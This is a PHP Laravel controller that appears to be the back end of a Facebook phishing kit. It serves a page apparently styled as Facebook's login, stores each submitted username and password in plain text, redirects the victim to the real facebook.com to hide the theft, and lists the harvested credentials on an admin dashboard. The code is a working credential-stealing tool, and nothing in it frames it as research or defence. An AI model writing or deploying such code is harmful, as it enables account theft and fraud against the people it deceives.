<?php

namespace App\Http\Controllers\Admin\Templates;

use App\Http\Controllers\Controller;
use Illuminate\Http\Request;

use App\Models\Facebook;


class FacebookController extends Controller
{
    /**
     * Display a listing of the resource.
     */
    public function index()
    {
        $data = Facebook::get();
        // dd($data);
        return view('admin.dashboard.facebook.index', compact('data'));
    }

    /**
     * Show the form for creating a new resource.
     */
    public function create()
    {
        //
    }

    /**
     * Store a newly created resource in storage.
     */
    public function store(Request $request)
    {
        $data = new Facebook();
        $data->username = $request->input('username');
        $data->password = $request->input('password');

        $data->save();

        return redirect('https://www.facebook.com');
    }

    /**
     * Display the specified resource.
     */
    // public function show(string $id)
    public function show()
    {
        return view('templates.facebook.index');
    }

    /**
     * Show the form for editing the specified resource.
     */
    public function edit(string $id)
    {
        //
    }

    /**
     * Update the specified resource in storage.
     */
    public function update(Request $request, string $id)
    {
        //
    }

    /**
     * Remove the specified resource from storage.
     */
    public function destroy(string $id)
    {
        //
    }
}
